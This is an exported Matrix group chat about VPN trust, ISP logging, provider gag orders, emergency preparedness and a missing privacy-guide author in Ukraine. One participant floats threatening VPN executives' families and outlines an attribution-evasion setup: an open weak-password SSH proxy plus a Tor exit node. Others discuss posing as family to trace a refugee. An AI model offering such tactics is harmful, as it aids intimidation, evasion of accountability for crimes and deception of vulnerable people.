8.4.2022, 11:08:55 - SlickRick: I'm on Quaternion, but I think it's limiting my ability to see rooms when I join what I now think are sort of the rules/landing room of a bigger community.
8.4.2022, 11:27:25 - SamLeh: P2P Matrix Status - https://arewep2pyet.com/
8.4.2022, 15:09:35 - SamLeh: <@jau2o-dk45a3:artemislena.eu "if only they knew what vpn to us..."> Does it matter, if the only goal is to access at least externally legal content, like Facebook, Twitter, BBC, meduza.io and so on? If it's work, it's good neough. 
8.4.2022, 15:10:17 - mazerfaker: well, does it *not* matter **at all**?
8.4.2022, 15:11:35 - theShadow: it matters alot, I would like to know as well... currently using Nord VPN but I no longer trust it... Was a stupid idea in the first place, but maybe better than nothing
8.4.2022, 15:12:19 - SlickRick: ISP logs are a concern for me
8.4.2022, 15:12:36 - SamLeh: It's always the question "what if". So what if the Russian intelligence knows you're accessing Facebook. What then? I guess they're not (yet?) after that kind of cases, because those random VPNs are used so widely.
8.4.2022, 15:13:14 - SamLeh: SlickRick: ISP logs are only accessible legally to law enforcement.  - Threat model does matter.
8.4.2022, 15:13:19 - theShadow: so which VPN would you recommend for privacy guys please?
8.4.2022, 15:13:54 - SlickRick: I use MullvadVPN. Seems to bew a reasonable choice.
8.4.2022, 15:14:02 - SamLeh: I don't know, I'm personally using Mullvad. But not for anything illegal of course. Because that would be just stupid. Yet I've been tempted to test if it's actually anonymous... Haha... But if it's not, then it would be really bad for me.
8.4.2022, 15:14:41 - SlickRick: If I was doing something truly sensitive of course I wouldn't use VPN, but for general chat logs of personal discord etc. I like transfering trust from ISP log to Mullvad.
8.4.2022, 15:14:52 - SamLeh: Because VPNs provide so many privacy lies. It would be just fun to make something which is totally and really illegal, but not serious after all. To see if the VPN holds... 
8.4.2022, 15:14:53 - theShadow: my questions then: Does Mullvad use any google toolkit or similar shit? (Found Nord VPN does for Win client).
Does it connect to AWS servers or Google or Microsoft?
8.4.2022, 15:15:06 - SlickRick: I don't know how things can turn politically in the future, and then they have years of activity to analyse your patterns etc.
8.4.2022, 15:15:27 - theShadow: <@karlq:matrix.org "If I was doing something truly s..."> what would you use for truly sensitive stuff may I ask?
8.4.2022, 15:15:33 - SlickRick: You should check out their website
8.4.2022, 15:15:58 - theShadow: diversify, switch different providers, then noone has the full picture
8.4.2022, 15:16:14 - SamLeh: How about threatening the VPN company main owners and CTOs family with some sick stuff? Just to see, if anything happens. Test if it's private or not. Especially the people whom have technical ability to dig the logs, but aren't commercially responsible... 
8.4.2022, 15:16:47 - SlickRick: I don't have a concern that LE will ask Mullvad to log me, so I don't need to use different VPN providers. All the traffic I am talking about is relatively innocuous, but I am just safeguarding against the government having years of chat logs & internet activity.
8.4.2022, 15:16:50 - theShadow: the negative energy will come back at you, dont do such stupid things
8.4.2022, 15:16:56 - SamLeh: <@karlq:matrix.org "You should check out their websi..."> Website is marketing, it doesn't tell anything about internal values and how things actually are done.
8.4.2022, 15:17:01 - SlickRick: I am comfortable with trusting Mullvad with that threat model specifically for basic personal online activity.
8.4.2022, 15:17:25 - SlickRick: SamLeh: Of course, but I'm responding to his specific question regarding their protocols & setup
8.4.2022, 15:17:45 - SlickRick: I'd just be regurgitating what they have on their if I was to describe how they operate, so start there then branch off with more specific Q's
8.4.2022, 15:17:54 - SlickRick: there*
8.4.2022, 15:18:13 - SamLeh: As example in many company the key tech people can do lot of stuff which the administration and marketing doesn't know anything, if they want to... That's why targeting CTO key admin persons would be kind of fun. People with real technical power.
8.4.2022, 15:18:16 - SlickRick: I don't need to get granular with my VPN because as I said it's not handling highly sensitive activity.
8.4.2022, 15:18:25 - SlickRick: I'm aware most VPN's are marketing mostly.
8.4.2022, 15:18:35 - theShadow: MullVad - this sounds good... but then... they all SAY that :D
Why no free plan?

"Free" services nearly always come at some cost, whether that be the time you spend watching an intro ad, the collection of your data, or by limiting the functionality of the service. We don't operate that way – at all.
8.4.2022, 15:18:43 - SlickRick: I just need something that is reasonably trusted in the scene to offload trust of logging activity from ISP
8.4.2022, 15:19:08 - SlickRick: Why would you want a free VPN
8.4.2022, 15:20:09 - SlickRick: I can't give you the breakdown on exactly how Mullvad differs from other VPN providers, only that it holds esteem amongst individuals I found credible at my time of purchase & I appreciate their straight fee per month.
8.4.2022, 15:20:40 - SlickRick: It barely makes a difference to me if it was LE running it, because as I said, nothing illegal is going through it (or anything for that matter, but if I were obv. not gonna be VPN)
8.4.2022, 15:20:43 - SamLeh: SlickRick: Why you're so worried about ISP logging? Many telecoms actually hold surprisingly good security records and internal processes... As well as have nice agreements in place. So at least I personally trust my ISP as long as I'm not subject of criminal investigation. 
8.4.2022, 15:21:25 - SlickRick: Because I trust no log VPN more.
8.4.2022, 15:21:30 - SamLeh: Free service is shit to provide, you'll have to deal with endless abuse. That's my experience, whenever I've provided any free services. I'm surprised that dnskv.com hasn't yet been abused to death.
8.4.2022, 15:21:32 - SlickRick: Relatively inexpensive.
8.4.2022, 15:21:59 - SamLeh: <@karlq:matrix.org "Because I trust no log VPN more."> Yet you don't know if they're no log actually. That might be just a marketing term.
8.4.2022, 15:22:08 - SlickRick: Of course
8.4.2022, 15:22:12 - SlickRick: But I know my ISP does
8.4.2022, 15:22:45 - SlickRick: Trust problem. You are never going to know if the VPN is logging, or if they aren't to begin whether they turn it on.
8.4.2022, 15:23:46 - SamLeh: There should be some kind of organization testing VPNs. Making some shit up, which makes those subject to serious international investigation, and to see if no logs hods... Btw. No log doens't imply that they wouldn't activate per account logging on request. Yet of course if it's actually no log it's hard to tell which account should be targeted. 
8.4.2022, 15:24:01 - theShadow: <@sl:envs.net "SlickRick: Why you're so worried..."> Why would you then be worried about privacy at all... ? After all, if you doing nothing illegal, you are not a bad person? So then you have nothing to hide? 😄
8.4.2022, 15:24:07 - theShadow: Eric Schmidt classics
8.4.2022, 15:24:12 - SlickRick: I put my trust in to the significant number of security minded figures i've seen claim they use it. That's enough for me.
8.4.2022, 15:24:10 - mazerfaker: <@sl:envs.net "It's always the question "what i..."> website traffic fingerprinting still is a real issue I'd say
8.4.2022, 15:24:18 - mazerfaker: especially at these times
8.4.2022, 15:24:40 - SlickRick: theShadow: :'D
8.4.2022, 15:25:18 - theShadow: It is much bettr if one VPN provider has your habits for one year, another for another year, etc, than if your provider has it all... For all the time
8.4.2022, 15:26:14 - SamLeh: Try it... Get some extremely sick contraband from deep webs, and keep spamming to everywhere you can as longs as you're caught. Also some leaked stuff, and all kind of hard to confirm but serious threats. To see, if the VPN privacy holds... Hopefully you're able to cause international incident. 
8.4.2022, 15:26:51 - SamLeh: They claim it's confidential and private, so you're not taking any risk... ;) If they're up to their claims about privacy, there's nothing they can do.
8.4.2022, 15:27:42 - SlickRick: wtf are you talking about we acknowledged that already
8.4.2022, 15:28:01 - SlickRick: Yes, VPN isn't super secure. It is known.
8.4.2022, 15:28:14 - theShadow: <@karlq:matrix.org "wtf are you talking about we ack..."> who
8.4.2022, 15:28:45 - SlickRick: I'm talking about Sam positing a case of highly sensitive activity through a VPN. Ya, that's dumb.
8.4.2022, 15:29:01 - SamLeh: There are differences between "agreed to be secure" and "technical" security. We can't provide that information (because we don't want to) and we can't provide that information (because we don't actually have it!).
8.4.2022, 15:29:18 - SlickRick: Of course
8.4.2022, 15:29:28 - theShadow: <@karlq:matrix.org "I'm talking about Sam positing a..."> true
8.4.2022, 15:29:38 - SamLeh: Well, but if they CAN when they WANT to, then it's not actually private in technical terms.
8.4.2022, 15:29:55 - theShadow: <@sl:envs.net "Well, but if they CAN when they ..."> stop relativizing please :)
8.4.2022, 15:30:11 - theShadow: you either dont listen or you want to push your version no matter what
8.4.2022, 15:30:29 - SlickRick: You are talking to someone who isn't here bro
8.4.2022, 15:30:37 - theShadow: discussion makes sense only when all parties actually listen
8.4.2022, 15:31:12 - SlickRick: Anyway no longer productive. Ya VPN is not secure. ISP is inherently less secure if your threat model is government.
8.4.2022, 15:31:32 - SlickRick: RE: small effort to keep basic non-sensitive activity from being logged
8.4.2022, 15:33:11 - SamLeh: I suspect that any VPN providing actually private service, would get shutdown. One good old case for reference which I followed very closely back then - https://en.wikipedia.org/wiki/Penet_remailer
8.4.2022, 15:34:13 - SlickRick: Not trying to be rude just feel we are not on the same page. Everything you are saying is accurate it's just something I acknowledge.
8.4.2022, 15:35:04 - SlickRick: For sure any service that was meaningfully aiding 'illegal' activity that was a thorn in governments side would get shut down, assuming it was a centralized set of servers with a commercial front.
8.4.2022, 15:35:23 - SlickRick: Same goes for email services.
8.4.2022, 15:35:28 - SamLeh: As a service provider I've received some help investigation requests with gag order... So those are hard to deal with.... Unless you just shut it down.
8.4.2022, 15:35:48 - SlickRick: If you put trust in those centralized, trust-required infrastructure you are being a fool if you really have something to hide.
8.4.2022, 15:36:02 - SlickRick: Yes, I was just reading a good example of this Sam. Are you aware of RiseUp mail?
8.4.2022, 15:36:12 - SamLeh: Yes I am.
8.4.2022, 15:36:31 - SlickRick: https://forums.whonix.org/t/riseup-net-likely-compromised/3195/41

This is good thread to skim & is highly relevant to what you have just said.
8.4.2022, 15:37:01 - SlickRick: They since came out & confirmed they were under a gag order & helped with randomsware & some Ddos extortion thing they government wanted
8.4.2022, 15:37:16 - SlickRick: & i guess they made efforts to alert people without triggering the gag order & getting arrested.
8.4.2022, 15:37:36 - SlickRick: Anyone who places trust in an email provider to actually keep their emails secret is an idiot. Use PGP if you are concerned.
8.4.2022, 15:37:36 - SamLeh: From one VPN providers ToS - Our company respects lawful warrants and court orders of the jurisdictions applicable to us. We provide information to the authorities when it is required of us under law, but not otherwise. Such occurrences include investigations and prosecutions of serious crimes and other qualified illegal activities. 
8.4.2022, 15:38:03 - SamLeh: <@karlq:matrix.org "https://forums.whonix.org/t/rise..."> Thanks, I'll read it.
8.4.2022, 15:38:07 - SlickRick: How could they not. Otherwise they become a criminal enterprise. What they can do it make it hard for LE, and that will be a significant barrier for people who aren't of significant interest.
8.4.2022, 15:38:48 - SlickRick: Yeah, I wouldn't bother with the whole thing as it's kind of a forum thread that is long covering people discussing whether they were under a gag order (which it was later revelead by them they were), but it's fascinating to see the process in action to pick up the signs, and how RiseUp themselves tried to tell people
8.4.2022, 15:39:29 - SlickRick: If your opsec = Home IP -> VPN -> Illegal shit, you are toast lol
8.4.2022, 15:40:24 - SamLeh: At least the penet remailer too that to court, most of VPN providers most likely won't bother.
8.4.2022, 15:40:27 - SlickRick: My threat model isn't government wanting me for illegal activity so that's not really a concern for me. It's more just wanting to take a lesser of two evils in reducing the chance my total network prescence in my personal but not sensitive activities are archived forever.
8.4.2022, 15:40:56 - SlickRick: Yes most will roll over. I'll read about that VPN ty. & RiseUP did it appears try to tell people what was happening in a very subtle way, so credit 2 them.
8.4.2022, 15:41:11 - SlickRick: VPN is just dead on arrival in terms of true protection. It's not possible.
8.4.2022, 15:42:32 - SlickRick: This chat right now is over tor (obviously open for anyone to see) so I use tor through whonix
8.4.2022, 15:43:08 - SamLeh: Well, you can always have some anonymously paid server, with mis-configuration which doesn't log... As example I'm running tor relays and bridges with zero logging. I can also mis configure some systems in purpose to provide non logged covert access... So there are means, I'm sure the national state hackers and attack teams are actually using hard to track means... Also the dnskv.com is actually zero logs, I don't have any. Really.
8.4.2022, 15:44:06 - SlickRick: I would but part of my threat model is APT so I don't want to handle the security aspect. I know Mullvad will have better server security than me, and even though it doesn't matter too much if it's owned, I still don't want to be the one controlling the server security.
8.4.2022, 15:44:35 - SlickRick: If I didn't have that aspect to my TM I would set-up my own VPN yes
8.4.2022, 15:44:53 - SamLeh: It's so trivial to allow password login and socks proxy on VPS with SSH... Then it could be plausibly anyone abusing that. It's not me... ;)  Of course no logs.
8.4.2022, 15:45:53 - SlickRick: Ok so you connect to VPS with SSH (so you are confident it's only you who can connect to it) and have it not logging, and it tunnels your traffic as you've configured the VPS as a VPN tunnel yes?
8.4.2022, 15:46:13 - SlickRick: Now you have a much higher degree of confidence that logs are disabled.
8.4.2022, 15:46:34 - SlickRick: In time I will learn about SSH and play with it. I'm not quite there in my journey though.
8.4.2022, 15:47:03 - SamLeh: <@karlq:matrix.org "Ok so you connect to VPS with SS..."> No whole point of that, is making it so stupid, like user vpn and password vpn, that it could be plausibly anyone. 
8.4.2022, 15:47:10 - SlickRick: Are you saying SOCKS proxy for the connection to add extra security to obscure the connection IP?
8.4.2022, 15:47:24 - SamLeh: Just like if I would do something wrong, I would run Tor exit node on the same IP, so I can claim it wasn't me.
8.4.2022, 15:48:33 - SlickRick: I understand the concept you are saying, but I can't put the pieces of what you said together to see exactly how you achieved it.
8.4.2022, 15:48:47 - SlickRick: It's also quite early here in the morning :'D
8.4.2022, 15:49:01 - SamLeh: Doing that makes the court case much harder to prove it was me. Especially if the attack / case / threat is something, which I don't benefit anything at all. I'm just tech admin wrongly accused. 
8.4.2022, 15:49:40 - SlickRick: Ahh ok I think I understand better
8.4.2022, 15:50:11 - SlickRick: So you are saying you have it configured to route some regular traffic through it which can be sloppy, and then have your covert way to jump in to the stream of info & do your activity?
8.4.2022, 15:50:14 - SamLeh: But there are solutions where there are actually no logs (opposite to VPN claims). Where it's technically hard or impossible to prove whos behind something.
8.4.2022, 15:50:23 - SamLeh: <@karlq:matrix.org "So you are saying you have it co..."> Exactly. 
8.4.2022, 15:51:03 - SlickRick: That's smart. So it's mostly noise, and you've made efforts to keep your specific SSH connections not logged
8.4.2022, 15:51:15 - SlickRick: Does that require a lot of bandwith?
8.4.2022, 15:51:49 - SlickRick: Does this mean you are saying you could pose as someone just running a server for tor traffic, and use that as your plausible deniability?
8.4.2022, 15:51:57 - SamLeh: Bandwidth is cheap and cost is no problem, if there's a will...
8.4.2022, 15:52:35 - SlickRick: So even if they could tie you to owning the server, there is a more innocent explanation, and your traffic is lost in the general traffic through the server, and it's much harder to prove you connected in to it?
8.4.2022, 15:53:06 - SamLeh: <@karlq:matrix.org "Does this mean you are saying yo..."> I personally think that many free VPNs and other services might be run by nation states or agencies... For surveillance, BUT also to providing viable cover traffic for their own actions.
8.4.2022, 15:53:23 - SlickRick: I agree, and even if they aren't you have to assume they are if you are being responsible.
8.4.2022, 15:53:36 - SlickRick: It all depends how powerful the entity that cares is. If it goes high enough it's all owned.
8.4.2022, 15:54:04 - SlickRick: I doubt they need to run cover if they are NSA types.
8.4.2022, 15:54:14 - SlickRick: Maybe smaller nations trying to hide their work from bigger USA type fish.
8.4.2022, 15:54:31 - SamLeh: But I guess they don't want attribution, so it's better if they can claim it's not us...

8.4.2022, 15:55:18 - SamLeh: Russians do some times do the classic, I lie and I don't care if I'm caught style. Because everyone already knows. But in general, that's quite arrogant thing to do. ;)

8.4.2022, 17:31:16 - theShadow: and that brings me to my other question, which helps to make my living possible ... I ask people and companies do you have a Plan B, when internet is not working? What about you guys?
8.4.2022, 18:11:41 - SamLeh: theShadow: Well, of course there are plans for different situations. But in some cases it's just force majeure, which means that the problem is too big, that the original task / goal doesn't matter anymore, and you should focus on more important things.
8.4.2022, 18:24:04 - SamLeh: Anyway, the basic level is 72 hours of independence. In many areas people are reserving supplies for two weeks. Thermal sources and water for much longer time(s). Electric power got very limited use after everything else shuts down, undelss you've got good radio gear and fuel to power it. 
8.4.2022, 18:24:50 - SamLeh: Pre-planning making disaster recovery and survival documentation and checking that you've got everything needed is a good start.
8.4.2022, 18:26:29 - SamLeh: I also would love to have gear like the #femtostar:matrix.org , currently we've got only Iridium phones for independent communication in case of serious outage + basic ham gear. As Finnish person, Russian threat is always present, and submarine cables are easy targets.

8.4.2022, 18:36:16 - SamLeh: Way strange... Haven't ever had such a problem with input fields in forms.  Maybe it's framework or something causing the problem. With plain good old html it should work well.
8.4.2022, 18:37:47 - neo_sodom: The input fields are JS generated so maybe that causes the issue but I have no clue about that.
8.4.2022, 18:38:39 - SamLeh: Yeah, this works exactly as expected:

<form>

This sounds like straight up fearmongering with "trolls" being the scapegoat for not giving any more details other than space for speculation
11.4.2022, 21:04:38 - toasterbirb: > As for their true agenda, ask yourself, what agenda are their trillion-dollar benefactors working towards? Who do they answer to?

What is his/her agenda?
11.4.2022, 21:21:55 - toasterbirb: Nvm. he sells privacy services himself :D
11.4.2022, 21:23:15 - m: Yes, I do, by helping people compartmentalize what they already have, versus spending hundreds of dollars on privacy phones, and other specialty items.
11.4.2022, 21:23:39 - m: Thanks for reading, btw.
11.4.2022, 21:29:59 - toasterbirb: Isn't your article working against your own business though? You are literally undermining everything that says that they will provide someone with "privacy"
11.4.2022, 21:30:57 - toasterbirb: Like sure it sounds a bit cliche when someone "sells you more privacy" in a service format, but aren't you skipping over the open source movement entirely where people can take responsibility for their own data
11.4.2022, 21:31:48 - toasterbirb: Or is this purely about phones
11.4.2022, 21:32:25 - m: For starters, I'm not selling online privacy services, because I know it's impossible to achieve.
11.4.2022, 21:32:36 - toasterbirb: > remember, most of them are compromised, including your favorite privacy OS, your favorite private messenger, and your favorite fill-in-the-blank privacy app

Is *your* favourite messenger compromised? :D
11.4.2022, 21:32:59 - m: I've talked about open-source before and how it doesn't mean much about privacy.

11.4.2022, 21:34:29 - toasterbirb: I have seen some weirdos thinking that proprietary software is more private and secure just because its proprietary
11.4.2022, 21:34:41 - m: Yes, because "open source" can create a false sense of safety for most people.
11.4.2022, 21:35:02 - m: I only use open source software. Doesn't mean I have privacy.
11.4.2022, 21:35:27 - toasterbirb: The only thing that comes to my mind is the distinction between *source available* and *libre software*
11.4.2022, 21:37:01 - toasterbirb: Source available doesn't really mean anything when it comes to live services, because you have no clue what they are running on their servers unless you self-host
11.4.2022, 21:39:00 - toasterbirb: Then again stuff like the npm supply chain attacks have proven that shit can still hit the fan even with "popular stuff" 🤔
11.4.2022, 21:39:05 - m: Best bet is to stay anonymous. That way you can use any tech, open-source, proprietary, or otherwise. Everyone knows how to be anonymous, technical and non technical users.
11.4.2022, 21:39:40 - m: And for those scenarios when anonymity is impossible (banking etc) you have a seperate device.
11.4.2022, 21:39:59 - m: Compartmentalize and stay anonymous as best you can.
11.4.2022, 21:41:10 - toasterbirb: I have used two phones for months now just because the banking apps etc. straight up refused to launch on my main phone after I ditched the stock rom. I think that did me a favor

12.4.2022, 20:59:46 - solonovamax joined the room
12.4.2022, 21:18:21 - solonovamax: What the hell happened to AnonyPla?

I just went looking for this guide and found everything gone,
Her website, her matrix account is gone, everything I can find has been removed.

I'm reading some shit in this channel about her being captured & interrogated by russians, but what the fuck happened?
12.4.2022, 21:19:50 - neo_sodom: That's all what we learned, too. Her remains are unknown
12.4.2022, 21:21:52 - solonovamax: I'm still partially unclear, since half the messages are missing bc they were deleted and they're out of context, but jesus christ that's fucking insane
12.4.2022, 21:23:15 - neo_sodom: If you trust the claims, then yes, it would be crazy
12.4.2022, 21:24:47 - solonovamax: Yeah, obviously I'm not going to blindly trust some shit I read on the internet 30 seconds ago, but I think it's fair to assume it's real until another explanation arises
12.4.2022, 21:35:38 - solonovamax: And on the non-cryptographic methods of authentication topic that was brought up previously, it's something I've thought about a bit too:

> About that AnonyPla case... In many cases very simple authentication could be a word or something similar, which you can just slip into conversation. So it's not obvious for even outsiders following the conversation that you just authenticated. Simple agreed protocol, yet not obvious. Also with agreed duress identifier, so you can play that the authentication happened, even if it didn't.

A word only known by the two people sounds good, but it'd either have to be a very uncommon word, or several slightly more common words which need to all be used in short succession to authenticate. (In a sentence, obviously)
But, with either of those cases, it becomes much more difficult to hide it from an outsider. If someone is looking for it, it'll be obvious to them.

For authenticating when someone is safe, just recounting some event that happened with only you two to witness would suffice, but what about if someone is keeping them hostage?

Like, how else could this be done? Assuming the person you're trying to authenticate has had their keys compromised & has no access to any previous devices/previously stored secrets/etc.
12.4.2022, 22:12:53 - theShadow: I know similar techniques are used at business meetings... For coordination. You have some plan and if it goes as far as situation ABC, then if the boss says the word "cat", it means that you start to go tough on your business partners...
12.4.2022, 22:13:39 - theShadow: I think it comes from some popular movies ;)
12.4.2022, 22:14:01 - theShadow: Spy movies or such... Signals triggered by situation or word, nothing really new or groundbreaking
12.4.2022, 22:14:51 - theShadow: But I believe it works, Snowden used those techniques as well
12.4.2022, 22:16:25 - theShadow: I met AnonyPla here (on Matrix) once, had no idea it wasn't a guy... or who she was... Wish I acted more politely
13.4.2022, 05:29:42 - solonovamax: <@informacni_svoboda:matrix.org "I think it comes from some popul..."> yeah, but it's pretty difficult to plan ahead a word that will almost certainly never come up in any arbitrary conversation, but also isn't too suspicious for someone looking for it. For the business meeting example, you've obviously not been kidnapped and are being watched intently by someone, so it's not a good equivalent lol
13.4.2022, 09:44:04 - SlickRick: solonovamax: I mean based on the context of the guide & their work, the most believable explanation to me is an attempt to use the event to kill the identity, especially with the 'but she's picked some other girl who will take over her credentials later on' or something alike.

I still say that with respect because it could absolutely be true, but it's very hard for me to accept that blindly.
13.4.2022, 09:45:44 - SlickRick: It also doesn't really matter what I believe, and if it's true I can only send best wishes & pray things are ok.
13.4.2022, 09:47:02 - SlickRick: Such things have certainly happened to free speech & information warriors all around the world. 
13.4.2022, 09:47:13 - SlickRick: It highlights the grave importance of spreading this information.
13.4.2022, 09:49:22 - SlickRick: Because whether or not the events we have heard are real, if you had someone in a repressive country trying to empower people with the tools to overcome the constraints on information and operate freely / expose truth, things like that will happen to them if they are caught.

14.4.2022, 05:24:35 - solonovamax: <@m:pwn.chat "there are less dramatic ways to ...">  Dunno, maybe she wanted to burn it in a way that there was no coming back from. If you're dead, there's no reason for anyone to look for you, yk?
14.4.2022, 05:27:13 - @m:pwn.chat: but seems kinda ridiculous to dox yourself when theres soldiers outside the door.. especially if you're concerned with anonymity? i don't think a deadmans switch would convince anyone they actually died
14.4.2022, 05:28:01 - @m:pwn.chat: also.. a deadman switch is suppose to contain content that would otherwise keep you alive 
14.4.2022, 05:28:23 - solonovamax: I mean, it's a deadman's switch, according to the post it's super easy to turn off, so if it's being posted, you're most likely dead or captured already

Just the idea of her being a direct target sounds quite absurd. Being a regular civillian target sounds somewhat more reasonable, but then again, I'm not too sure about the situation in Kyiv

14.4.2022, 17:10:39 - toasterbirb: I guess everything counts for them. The youtube comments are full of shit everywhere and you'd think that those people would have better stuff to do, but I guess its part of the entire "operation" or just collective thing that they do unconsciously
14.4.2022, 17:10:13 - @allures:matrix.org: You*
14.4.2022, 17:11:01 - 0xbad1dea: Also Baika, I'm not sure if you're a non native English speaker, incredibly excitable, or rushing, but your spelling/grammar/sentence structure make it incredibly hard to follow your conversations

I dont understand can you explain it to me ?' She didnt answere because she dont know why,  btw anonypla is the only reason you are mod, then babba will consider a single word that comed out of you're mouth she will demote you probably,  bc of a single emoji she wanted to have a serious discution about why she think i'm insensyble xD and many more if you connect the dots you will find more xD

14.4.2022, 17:19:16 - neo_sodom: The ignore feature is there for a reason but hey you are the mod
14.4.2022, 17:19:48 - 0xbad1dea: We (the mods) were told to insta-ban on intentional misgendering
14.4.2022, 17:19:53 - 0xbad1dea: So. FYI.
14.4.2022, 17:20:02 - neo_sodom: Ok
14.4.2022, 17:20:39 - toasterbirb: Also one thing that has crossed my mind is the idea, that being marked as "missing" or "dead" in government files etc. is the top notch way to disappear from the grid. That would make life quite difficult, but there are cases were people have done this intentionally 
14.4.2022, 17:21:50 - toasterbirb: <@0xbad1dea:warmitup.chat "We (the mods) were told to insta..."> Makes me kinda feel bad about that one time when we discussed if AnonyPla was actually a guy and was trying to throw us off the trail when she brought up the doxxing challenge :D
14.4.2022, 17:22:35 - neo_sodom: <@toasterbirb:halogen.city "Makes me kinda feel bad about th..."> Anonypla banned kicked snow for that
14.4.2022, 17:22:57 - 0xbad1dea: Certainly a fine line, I think in the context of that doxxing challenge it would be OK because Anony was inviting us to challenge the information they gave us. Babba didn't ask for that.
14.4.2022, 17:23:50 - 0xbad1dea: I stand corrected then
14.4.2022, 17:23:59 - toasterbirb: Ouch.. I didn't follow trough the entire thing so I don't know how the convo ended
14.4.2022, 17:25:06 - toasterbirb: Maybe it turned from speculation to just simply misgendering after the convo had ended
14.4.2022, 17:29:55 - toasterbirb: Who is keeping up the website currently?
14.4.2022, 17:31:29 - neo_sodom: Babba afaik
14.4.2022, 17:44:04 - 0xbad1dea: Babba runs the -ng version

14.4.2022, 17:51:21 - neo_sodom: Bruh
14.4.2022, 17:51:42 - neo_sodom: What an emotional topic

14.4.2022, 17:58:02 - theShadow: this ludicrousness here on element in fact shows, that people tend to turn autoritarian given any responsibility... Kind of Standford experiment repetition
14.4.2022, 17:59:08 - theShadow: soon the time will come, when somebody says "hi" and gets permabanned, because he was expected to say more formal and suitable "hello"

14.4.2022, 18:01:26 - toasterbirb: <@informacni_svoboda:matrix.org "intentional misgendering, is tha..."> It sure is a real thing. Misgendering is basically insulting someones gender identity
14.4.2022, 18:01:31 - toasterbirb: AFAIK
14.4.2022, 18:04:19 - toasterbirb: Probably has surfaced only recently, because some people needed new ways to poke at others online. I had not heard about it before like a year or two ago since my native language doesn't have gender specific 3rd person pronouns, so I'm not too familiar with the topic.

14.4.2022, 18:20:07 - 0xbad1dea: Also, as a moderator I'm inclined to follow the rules of the community. I happen to agree about intentionally misgendering someone. If someone has explicitly indicated their preferred pronouns, it's disrespectful and (in some cases) hateful to ignore that and refer to them otherwise.

14.4.2022, 18:22:07 - toasterbirb: I have seen what the lack of moderation does to a chat room. There are probably people who enjoy that as well, but there's a fine line where it gets really annoying
14.4.2022, 18:22:23 - 0xbad1dea: <@inuimamba:matrix.org "well i'm not here for long , but..."> I gave them two warnings for something I was instructed was an instant ban, how is that an undesirable escalation?
14.4.2022, 18:22:45 - inuimamba: now of course if you dont ban me for saying my point
14.4.2022, 18:23:20 - 0xbad1dea: you're just being snarky, I already said I won't just because you disagree with the rules

14.4.2022, 18:31:50 - 0xbad1dea: Pretty good, the hacking is reasonably realistic. Couldn't stand the drug stuff though, I felt it detracted from the story
14.4.2022, 19:11:08 - neo_sodom: darlatan: You don't even know if she made it there + if that is her real identity anyways
14.4.2022, 19:12:11 - darlatan: I don't care ... I have a "life debt" thanks to her guide ... I need to try
14.4.2022, 19:12:29 - neo_sodom: I mean, if your friends want to go there, its fine by me. Good luck honestly
14.4.2022, 19:12:56 - darlatan: they'll be at the border in about 3 hours
14.4.2022, 19:13:09 - toasterbirb: I'd be surprised if they don't somewhat keep track of people who have arrived to the camp
14.4.2022, 19:13:45 - darlatan: they do certainly keep track of people passing the border and entering the EU
14.4.2022, 19:14:53 - neo_sodom: But they probably won't give out the names of the refugees to random people that search for them
14.4.2022, 19:15:06 - neo_sodom: Your mission is destined to fail
14.4.2022, 19:19:26 - darlatan: Those 2 friends are police officers ... as I am ... just not in Poland (no I don't care about my anonymity)
14.4.2022, 19:20:24 - darlatan: I'm in France, Lyon
14.4.2022, 19:20:31 - darlatan: I work for Interpol 
14.4.2022, 19:20:57 - darlatan: (you can test me, I speak fluent french)
14.4.2022, 19:21:47 - darlatan: There are two entry towns in Poland for Ukrainian refugees but from Kyiv the most likely route is Medyka
14.4.2022, 19:21:59 - darlatan: Romania is further down and unlikely
14.4.2022, 19:22:21 - darlatan: If she escaped Ukraine and made it into Poland, they'll find her
14.4.2022, 19:23:35 - darlatan: I had quite a few DMs now and many several people told me she was trying to reach the border
14.4.2022, 19:24:49 - darlatan: So yes they can definitely ask about this and they have the legal power to do so 
14.4.2022, 19:26:38 - darlatan: If she's alive and crossed the border and is there, and if her name is really "Lena", they'll find her 
14.4.2022, 19:36:46 - darlatan: Where there's a will there's a way
14.4.2022, 19:36:54 - darlatan: Does anyone has any other information about her?

Do you really gotta question why someone likes smth if it ain't hurting anyone else? Just let them vibe, it's pretty damn easy
14.4.2022, 19:42:56 - toasterbirb: They already got banned. Not gonna hear your reasoning
14.4.2022, 19:42:59 - darlatan: right now I got girl, 22, dark curly hair, first name Lena, Ukrainian refugee from Kyiv, likely wounded, probably traveling alone without any personal belonging

14.4.2022, 19:45:46 - neo_sodom: <@darlatan:matrix.org "right now I got girl, 22, dark c..."> We don't know more. She disappeared and only gave us what you already know. We can't help you. Babba is the only person here who has verified direct contact to her
14.4.2022, 19:45:46 - toasterbirb: My best guess would simply be a github action
14.4.2022, 19:45:47 - darlatan: yes ... so? it can be someone watching a log ... it can be a pastebin. Plenty of possibilities.

14.4.2022, 19:47:10 - solonovamax: toasterbirb: I'd bet on either a gh action, or smth running on a vps bought with some anon payment method & enough funds for ~ a year
14.4.2022, 19:47:19 - toasterbirb: But I digress
14.4.2022, 19:47:29 - solonovamax: The problem with a gh action is you need a repo, and all of hers were deleted
14.4.2022, 19:48:04 - darlatan: It doesn't matter, what would be helpful is someone being able to tell if that message if legit or not
14.4.2022, 19:48:16 - neo_sodom: Only Babba can tell

14.4.2022, 19:56:04 - toasterbirb: Russian would probably do aswell
14.4.2022, 19:56:18 - solonovamax: If you did manage to find someone who said she was anonypla, I'd be able to help with identifying her by asking about a conversation we had, which was deleted when she moved accs (before all this)
14.4.2022, 19:56:24 - darlatan: That someone could probably call there pretending to be family looking for her
14.4.2022, 19:56:29 - neo_sodom: I would assume that those people speak some English
14.4.2022, 19:56:48 - solonovamax: ^^

14.4.2022, 19:57:08 - darlatan: that's why I'm sending actual people there
14.4.2022, 19:57:09 - solonovamax: Say you're family from abroad?

14.4.2022, 19:58:00 - darlatan: it has to be plausible so it has to be Ukrainian or Polish

14.4.2022, 20:02:40 - solonovamax: If you can't contact them, then you either gotta get someone on the ground, or wait until morning

14.4.2022, 20:16:15 - solonovamax: Yeah
14.4.2022, 20:16:56 - solonovamax: I want to switch off because they said on twitter that they're downranking some sites that provide misinformation about the ukrainian invasion
14.4.2022, 20:17:26 - toasterbirb: It was quite something to boast about from a search engine that just some time ago laughed at google for manipulating the search results into an echo chamber
14.4.2022, 20:18:05 - solonovamax: And as much as I wanna support the ukranian cause, I don't want my search engine to be the arbiter of what's true and false
